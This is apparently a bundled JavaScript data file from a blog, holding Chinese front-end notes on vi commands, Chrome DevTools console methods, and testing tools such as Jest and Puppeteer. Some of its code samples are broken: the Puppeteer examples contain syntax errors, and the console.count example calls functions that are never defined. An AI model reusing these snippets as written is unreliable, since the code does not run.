[檔案名稱]</code></td>\n<td>另存新檔</td>\n</tr>\n<tr>\n<td><code>:q</code></td>\n<td>退出 vi</td>\n</tr>\n<tr>\n<td><code>:!q</code></td>\n<td>不存檔退出</td>\n</tr>\n<tr>\n<td><code>:wq</code></td>\n<td>存檔並退出 vi</td>\n</tr>\n<tr>\n<td><code>:x</code></td>\n<td>存檔並退出 vi</td>\n</tr>\n<tr>\n<td><code>:w !sudo tee %</code></td>\n<td>以 root 的權限存檔</td>\n</tr>\n<tr>\n<td><code>:e [檔案名稱]</code></td>\n<td>編輯其它檔案</td>\n</tr>\n<tr>\n<td><code>:e!</code></td>\n<td>還原至檔案編輯前的狀態</td>\n</tr>\n<tr>\n<td><code>:r [檔案名稱]</code></td>\n<td>讀取另一個檔案的內容，並添加到錨點行的後面</td>\n</tr>\n<tr>\n<td><code>:n</code></td>\n<td>切換到下一個開啟的檔案</td>\n</tr>\n<tr>\n<td><code>:N</code></td>\n<td>切換到上一個開啟的檔案</td>\n</tr>\n<tr>\n<td><code>:set nu</code></td>\n<td>顯示行號</td>\n</tr>\n<tr>\n<td><code>:set nonu</code></td>\n<td>取消行號顯示</td>\n</tr>\n<tr>\n<td><code>:files</code></td>\n<td>列出所有開啟的檔案</td>\n</tr>\n<tr>\n<td><code>:Ex</code></td>\n<td>開啟檔案瀏覽器</td>\n</tr>\n<tr>\n<td><code>:Ex [路徑]</code></td>\n<td>於指定路徑開啟檔案瀏覽器</td>\n</tr>\n<tr>\n<td><code>:Hex</code></td>\n<td>分割水平視窗後，再開啟檔案瀏覽器</td>\n</tr>\n<tr>\n<td><code>:Vex</code></td>\n<td>分割垂直視窗後，再開啟檔案瀏覽器</td>\n</tr>\n<tr>\n<td><code>:Tex</code></td>\n<td>新增頁籤後，再開啟檔案瀏覽器</td>\n</tr>\n<tr>\n<td><code>:Hex [路徑]</code></td>\n<td>分割水平視窗後，再於指定路徑開啟檔案瀏覽器</td>\n</tr>\n<tr>\n<td><code>:Vex [路徑]</code></td>\n<td>分割垂直視窗後，再於指定路徑開啟檔案瀏覽器</td>\n</tr>\n<tr>\n<td><code>:Tex [路徑]</code></td>\n<td>新增頁籤後，再於指定路徑開啟檔案瀏覽器</td>\n</tr>\n</tbody></table>\n<h3 id=\"視窗分割\">視窗分割</h3>\n<table>\n<thead>\n<tr>\n<th>按鍵</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>:new</code></td>\n<td>新增水平分割視窗</td>\n</tr>\n<tr>\n<td><code>:new 檔案名稱</code></td>\n<td>新增水平分割視窗，並在新增的視窗載入檔案</td>\n</tr>\n<tr>\n<td><code>:vnew</code></td>\n<td>新增垂直分割視窗</td>\n</tr>\n<tr>\n<td><code>:vnew 檔案名稱</code></td>\n<td>新增垂直分割視窗，並在新增的視窗載入檔案</td>\n</tr>\n<tr>\n<td><code>:sp</code></td>\n<td>新增水平分割視窗，並在新增的視窗載入目前的檔案</td>\n</tr>\n<tr>\n<td><code>:sp 檔案名稱</code></td>\n<td>新增水平分割視窗，並在新增的視窗載入檔案</td>\n</tr>\n<tr>\n<td><code>:vsp</code></td>\n<td>新增垂直分割視窗，並在新增的視窗載入目前的檔案</td>\n</tr>\n<tr>\n<td><code>:vsp 檔案名稱</code></td>\n<td>新增垂直分割視窗，並在新增的視窗載入檔案</td>\n</tr>\n<tr>\n<td><code>Ctrl + W -&gt; 方向鍵</code></td>\n<td>切換視窗</td>\n</tr>\n<tr>\n<td><code>:only</code></td>\n<td>僅保留目前的視窗</td>\n</tr>\n</tbody></table>\n<h3 id=\"頁籤\">頁籤</h3>\n<table>\n<thead>\n<tr>\n<th>按鍵</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>:tabe</code></td>\n<td>新增頁籤</td>\n</tr>\n<tr>\n<td><code>:tabe 檔案名稱</code></td>\n<td>新增頁籤，並在新頁籤載入檔案</td>\n</tr>\n<tr>\n<td><code>:tabc</code></td>\n<td>關閉目前的頁籤，等同 <code>:q</code></td>\n</tr>\n<tr>\n<td><code>:tabo</code></td>\n<td>關閉所有頁籤</td>\n</tr>\n<tr>\n<td><code>:tabn</code></td>\n<td>移至下一個頁籤</td>\n</tr>\n<tr>\n<td><code>:tabp</code></td>\n<td>移至上一個頁籤</td>\n</tr>\n<tr>\n<td><code>gt</code></td>\n<td>移至下一個頁籤</td>\n</tr>\n<tr>\n<td><code>gT</code></td>\n<td>移至上一個頁籤</td>\n</tr>\n<tr>\n<td><code>:tabfirst</code></td>\n<td>移至第一個頁籤</td>\n</tr>\n<tr>\n<td><code>:tablast</code></td>\n<td>移至最後一個頁籤</td>\n</tr>\n<tr>\n<td><code>:tabm 頁籤編號</code></td>\n<td>移至特定編號的頁籤 (編號從 0 開始)</td>\n</tr>\n<tr>\n<td><code>:tabs</code></td>\n<td>列出所有頁籤</td>\n</tr>\n</tbody></table>\n<h3 id=\"其它指令\">其它指令</h3>\n<table>\n<thead>\n<tr>\n<th>按鍵</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>J</code></td>\n<td>將錨點行與下一行合併</td>\n</tr>\n<tr>\n<td><code>u</code></td>\n<td>還原指令</td>\n</tr>\n<tr>\n<td><code>Ctrl + R</code></td>\n<td>重做指令</td>\n</tr>\n<tr>\n<td><code>Ctrl + N</code></td>\n<td>自動補齊曾輸入過的單字</td>\n</tr>\n<tr>\n<td><code>.</code></td>\n<td>重覆上一個指令</td>\n</tr>\n<tr>\n<td><code>! 命令</code></td>\n<td>執行 linux 指令，並顯示執行結果</td>\n</tr>\n<tr>\n<td><code>TOhtml</code></td>\n<td>將目前編輯的檔案轉換成 HTML 原始碼 (會新增一個水平分割視窗)</td>\n</tr>\n</tbody></table>\n<h3 id=\"檔案瀏覽器操作\">檔案瀏覽器操作</h3>\n<ul>\n<li>需先以 <code>:Ex</code> 或關聯指令進入檔案瀏覽器</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>按鍵</th>\n<th>功能</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-</code></td>\n<td>移動到上層目錄</td>\n</tr>\n<tr>\n<td><code>d</code></td>\n<td>建立目錄</td>\n</tr>\n<tr>\n<td><code>D</code></td>\n<td>刪除目錄</td>\n</tr>\n<tr>\n<td><code>R</code></td>\n<td>重新命名</td>\n</tr>\n<tr>\n<td><code>s</code></td>\n<td>切換排序方式</td>\n</tr>\n<tr>\n<td><code>r</code></td>\n<td>切換升冪/降冪排序</td>\n</tr>\n<tr>\n<td><code>i</code></td>\n<td>切換檔案的排列方式</td>\n</tr>\n<tr>\n<td><code>/</code></td>\n<td>搜尋字串</td>\n</tr>\n<tr>\n<td><code>x</code></td>\n<td>執行檔案</td>\n</tr>\n<tr>\n<td><code>o</code></td>\n<td>新增水平視窗</td>\n</tr>\n<tr>\n<td><code>v</code></td>\n<td>新增垂直視窗</td>\n</tr>\n</tbody></table>\n","date":"2019-07-18T07:13:00.000Z","excerpt":"","printDate":"July 18, 2019","printReadingTime":"10 min read"};

var route_34 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod55
});

var Mod56 = {"title":"前端筆記 (6) 網頁開發者工具","slug":"f2e-06-devtool","html":"<ul>\n<li><p><a target=\"_blank\" rel=\"nofollow\" href=\"https://pjchender.blogspot.com/2017/06/chrome-dev-tools.html\">[學習筆記] Chrome Dev Tools 開發者工具實用功能整理</a></p>\n</li>\n<li><p>在 console 視窗中點右鍵，勾選 <code>Log XMLHTTPRequest</code>，可以看到該網站所發出的 AJAX request。</p>\n</li>\n<li><p>在 console 中輸入 <code>document.designMode = &#39;on&#39;</code>， 點選網頁文字會直接出現游標，可以直接編輯網頁內容。</p>\n</li>\n</ul>\n<h2 id=\"debugger\">Debugger</h2>\n<ul>\n<li><code>Sources</code> -&gt; <code>Event Listener Breakpoints</code></li>\n<li>右鍵 -&gt; <code>Break on...</code> -&gt; <code>attribute modifications</code></li>\n<li>Step over Line of Code (step over)</li>\n<li>Step into Next Function Call (step into)</li>\n<li>Step out of Current Function (step out)</li>\n<li>右鍵 -&gt; <code>clear console history</code></li>\n</ul>\n<h3 id=\"monitor-event\">monitor event</h3>\n<ul>\n<li><code>monitorEvents(element, [event])</code> 設定斷點偵測觸發的事件</li>\n<li><code>unmonitorEvents(element, [event])</code> 關閉事件監聽</li>\n<li><code>getEventListeners(element)</code> 查看 DOM 元素綁定事件</li>\n</ul>\n<h3 id=\"html-element\">HTML Element</h3>\n<p>在 chrome 中可以像使用 jQuery 一樣使用 <code>$</code> 當做選擇器，<code>$</code> 表示的是 <code>document.querySelector([selector])</code>；如果要選擇多個 DOM 元素，要使用 <code>$$</code>，表示的是 <code>document.querySelectorAll([selector])</code>。</p>\n<p>也可以在 element 視窗中點選一個 DOMElement，接著在 console 中輸入 <code>$0</code>，一樣可以選到該元素，<code>$0</code> 表示的是當前 chrome 所選取到的元素。</p>\n<p>在 console 中可以使用 <code>keys(obj)</code> 和 <code>values(obj)</code> 來取的物件的鍵和值。</p>\n<h2 id=\"7-個好用的-console-除錯方法\">7 個好用的 <code>console</code> 除錯方法</h2>\n<h3 id=\"1-consolecount\">1. <code>console.count()</code></h3>\n<ul>\n<li>以所處的函式為目標，顯示被呼叫的次數。</li>\n<li>亦可傳入變數，單獨監看參數為該變數時的執行次數。</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">sayHello1</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">sayHello2</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  console<span class=\"token punctuation\">.</span><span class=\"token function\">count</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Indrek\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"William\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Kelly\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"2-consolewarn\">2. <code>console.warn()</code></h3>\n<ul>\n<li>用以警告開發者傳入的參數不足、所使用的 API／Package 為不推薦的版本…等等的訊息。</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">function</span> <span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">name</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>name<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">warn</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"No name given\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token function\">sayHello</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"3-consoletable\">3. <code>console.table()</code></h3>\n<ul>\n<li>以表格的形式顯示陣列、物件的內容。</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> fruits <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n  <span class=\"token string\">\"Apple\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Watermelon\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Orange\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Pear\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Cherry\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Strawberry\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Nectarine\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Grape\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Mango\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Blueberry\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Pomegranate\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Carambola\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Plum\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Banana\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Raspberry\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Mandarin\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Jackfruit\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Papaya\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Kiwi\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Pineapple\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Lime\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Lemon\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Apricot\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Grapefruit\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Melon\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Coconut\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Avocado\"</span><span class=\"token punctuation\">,</span>\n  <span class=\"token string\">\"Peach\"</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">table</span><span class=\"token punctuation\">(</span>fruits<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"4-consolegroup\">4. <code>console.group()</code></h3>\n<ul>\n<li>整理輸出訊息的巢狀層級，將輸出的資料分群。</li>\n</ul>\n<pre class=\"language-javascript\"><code class=\"language-javascript\">console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This is the first level\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Level 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">group</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Level 3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">warn</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"More of level 3\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">groupEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Back to level 2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">groupEnd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Back to the first level\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"5-consoletrace\">5. <code>console.trace()</code></h3>\n<ul>\n<li>追蹤 function 的堆疊。</li>\n</ul>\n<p><code>console.trace(new Hoge());</code></p>\n<h3 id=\"6-consoledir\">6. <code>console.dir()</code></h3>\n<ul>\n<li>檢視這個 DOM 元素中的所有屬性。</li>\n</ul>\n<p><code>console.dir(document.getElementsByTagName(&#39;div&#39;));</code></p>\n<h3 id=\"7-consoledirxml\">7. <code>console.dirxml()</code></h3>\n<ul>\n<li>查看 DOM 元素的樹狀結構。</li>\n</ul>\n<p><code>console.dirxml(document.getElementsByTagName(&#39;a&#39;));</code></p>\n","date":"2019-07-18T07:15:32.000Z","excerpt":"","printDate":"July 18, 2019","printReadingTime":"2 min read"};

var route_55 = /*#__PURE__*/Object.freeze({
  __proto__: null,
  'default': Mod56
});

var Mod57 = {"title":"前端筆記 (7) 網頁測試","slug":"f2e-07-unittest","html":"<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/yusong-blog/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%B8%AB%E5%9C%A8github%E4%B8%8A%E6%8C%81%E7%BA%8C%E6%95%B4%E5%90%88%E8%88%87%E9%83%A8%E7%BD%B2-ci-cd-9735f622ae68\">前端工程師在 GitHub 上持續整合與部署(CI/CD)</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Daara_y/items/4f006ead604e015186dc\">Chrome の拡張機能を 2 つ使うだけでブラウザの操作を自動化！？ - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/nezuq/items/c5e827e1827e7cb29011\">Web スクレイピングの注意事項一覧 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/Azunyan1111/items/b161b998790b1db2ff7a\">Python Web スクレイピング テクニック集「取得できない値は無い」JavaScript 対応@追記あり 6/12 - Qiita</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://hackmd.io/Jsn8miqHQdWUUdqgrIc9Cg\">六角學院線上分享單元測試 QA 區</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/ms314006/step-by-step-unit-testing\">step-by-step-unit-testing</a></li>\n</ul>\n<h2 id=\"1-selenium\">1. <a target=\"_blank\" rel=\"nofollow\" href=\"https://selenium.dev/\">Selenium</a></h2>\n<h2 id=\"2-jest\">2. <a target=\"_blank\" rel=\"nofollow\" href=\"https://jestjs.io/\">Jest</a></h2>\n<h3 id=\"安裝\">安裝</h3>\n<p><code>npm install --save-dev jest</code>\n<code>yarn add puppeteer jest</code></p>\n<h3 id=\"使用\">使用</h3>\n<p><code>util.test.js</code></p>\n<p><code>test()</code> 是 Jest 提供的 function，\n第一個參數為文字敘述，第二個參數則是傳入一個 function\n<code>expect()</code> 是傳入要接受測試的函式\n<code>toBe()</code> 是預期得到的結果</p>\n<p><code>npm run jest</code>: 測試所有的測試檔案\n<code>npm run jest [檔案]</code>: 測試指定檔案</p>\n<h3 id=\"參考\">參考</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://wcc723.github.io/development/2020/02/02/jest-intro/\">十分鐘上手前端單元測試 - 使用 Jest</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://medium.com/enjoy-life-enjoy-coding/%E8%AE%93-jest-%E7%82%BA%E4%BD%A0%E7%9A%84-code-%E5%81%9A%E5%96%AE%E5%85%83%E6%B8%AC%E8%A9%A6-%E5%9F%BA%E7%A4%8E%E7%94%A8%E6%B3%95%E6%95%99%E5%AD%B8-d898f11d9a23\">Jest | 讓 Jest 為你的 Code 做測試-基礎用法教學</a></li>\n</ul>\n<h2 id=\"3-cypressio\">3. <a target=\"_blank\" rel=\"nofollow\" href=\"https://www.cypress.io/\">Cypress.io</a></h2>\n<h2 id=\"4-storybook\">4. <a target=\"_blank\" rel=\"nofollow\" href=\"https://storybook.js.org/\">Storybook</a></h2>\n<h2 id=\"5-nightwatch\">5. <a target=\"_blank\" rel=\"nofollow\" href=\"https://nightwatchjs.org/\">Nightwatch</a></h2>\n<h2 id=\"6-puppeteer\">6. <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/puppeteer/puppeteer\">Puppeteer</a></h2>\n<h3 id=\"簡介\">簡介</h3>\n<p>Puppter 是由 Google Chrome 官方團隊所推出的無界面 (Headless) Chrome 工具，是一套 Node 的 Library，提供 API 透過 DevTools Protocol 控制無介面的 Chrome，亦可透過調整參數使用完整版的 Chrome。</p>\n<p>常見用途：</p>\n<ul>\n<li>產生網頁頁面的截圖或 PDF 檔</li>\n<li>抓取 Single Page Application 產生預覽內容 (Server-Side Rendering)</li>\n<li>從網站上抓取想要的內容</li>\n<li>自動送出表單、測試 UI、控制輸入</li>\n<li>建構自動化測試環境</li>\n</ul>\n<h3 id=\"安裝-1\">安裝</h3>\n<p><code>yarn add puppeteer</code>\n<code>npm i puppeteer</code></p>\n<h3 id=\"使用-1\">使用</h3>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> puppeteer <span class=\"token operator\">=</span> <span class=\"token function\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'puppeteer'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">const</span> url <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n\n<span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> browser <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span><span class=\"token punctuation\">.</span>puppeteer<span class=\"token punctuation\">.</span><span class=\"token function\">launch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">const</span> page <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> browser<span class=\"token punctuation\">.</span><span class=\"token function\">newPage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n  <span class=\"token keyword\">await</span> page<span class=\"token punctuation\">.</span><span class=\"token function\">goto</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">)</span>\n\n  <span class=\"token comment\">// action here...</span>\n\n  <span class=\"token keyword\">await</span> browser<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre><h4 id=\"可進行操作\">可進行操作</h4>\n<p>截圖: <code>await page.screenshot({path: &#39;screenshot.png&#39;})</code></p>\n<p>只截取特定部份:</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> element <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> page<span class=\"token punctuation\">.</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'h1'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">await</span> element<span class=\"token punctuation\">.</span><span class=\"token function\">screenshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span>path<span class=\"token operator\">:</span> 'screenshot_h1<span class=\"token punctuation\">.</span>png<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span></code></pre><p>執行 JS:</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">await</span> page<span class=\"token punctuation\">.</span><span class=\"token function\">evaluate</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">const</span> h1 <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"h1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  h1<span class=\"token punctuation\">.</span>textContent <span class=\"token operator\">=</span> <span class=\"token string\">\"hoge\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>點擊: <code>await page.click(&#39;.button_element&#39;)</code></p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> button_element <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> page<span class=\"token punctuation\">.</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".button_element\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">await</span> button_element<span class=\"token punctuation\">.</span><span class=\"token function\">click</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><p>等待: <code>await page.waitForNavigation({waitUntil: &#39;domcontentloaded&#39;})</code>\n<code>await page.waitFor(&#39;.lazy&#39;)</code>\n<code>await page.waitFor(5000)</code></p>\n<p>取得 DOM 樹:</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> bodyHandle <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> page<span class=\"token punctuation\">.</span><span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">'body'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">const</span> html <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span><span class=\"token punctuation\">.</span>page<span class=\"token punctuation\">.</span><span class=\"token function\">evaluate</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">body</span> <span class=\"token operator\">=></span> body<span class=\"token punctuation\">.</span>innerHTML<span class=\"token punctuation\">.</span>bodyHandle<span class=\"token punctuation\">)</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>html<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre><h3 id=\"參考-1\">參考</h3>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://zhaoqize.github.io/puppeteer-api-zh_CN/#/\">Puppeteer v2.1.1 API</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://techblog.gmo-ap.jp/2018/12/28/puppeteer%E3%81%A7%E3%81%A7%E3%81%8D%E3%82%8B%E3%81%93%E3%81%A8%E3%81%BE%E3%81%A8%E3%82%81/\">Puppeteer でできることまとめ</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://ithelp.ithome.com.tw/articles/10202445\">Day 17 Puppeteer API 介紹 - class: Page method part 3 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/KawamotoShuji/items/878ae659a5c6e540343e\">うるるを Puppeteer でスクレイピングしてみた</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://qiita.com/go_sagawa/items/85f97deab7ccfdce53ea\">puppeteer での要素の取得方法</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/chenxiaochun/blog/issues/38\">Puppeteer：模拟浏览器操作行为的利器</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.techbridge.cc/2019/07/13/medium-crawler/\">Medium 爬蟲進化史</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://blog.typeart.cc/using-puppeteer-crawler-common-skills/\">Puppeteer 爬蟲常用技巧</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/puppeteer/puppeteer/blob/main/examples/block-images.js\">puppeteer/block-images.js at main · puppeteer/puppeteer</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/puppeteer/puppeteer/blob/main/docs/api.md#pagesetrequestinterceptionvalue\">puppeteer/api.md at main · puppeteer/puppeteer</a></li>\n</ul>\n<h2 id=\"文章\">文章</h2>\n<ul>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.ptt.cc/bbs/Soft_Job/M.1332567899.A.C00.html\">[閒聊] 笑談軟體測試的幾個階段（一） - 看板 Soft_Job - 批踢踢實業坊</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.ptt.cc/bbs/Soft_Job/M.1332601969.A.342.html\">[閒聊] 笑談軟體測試的幾個階段（二） - 看板 Soft_Job - 批踢踢實業坊</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.ptt.cc/bbs/Soft_Job/M.1332681709.A.EB4.html\">[閒聊] 笑談軟體測試的幾個階段（三） - 看板 Soft_Job - 批踢踢實業坊</a></li>\n<li><a target=\"_blank\" rel=\"nofollow\" href=\"https://www.ptt.cc/bbs/Soft_Job/M.1332697283.A.630.html\">[閒聊] 笑談軟體測試的幾個階段（四） - 看板 Soft_Job - 批踢踢實業坊</a></li>\n<li><a 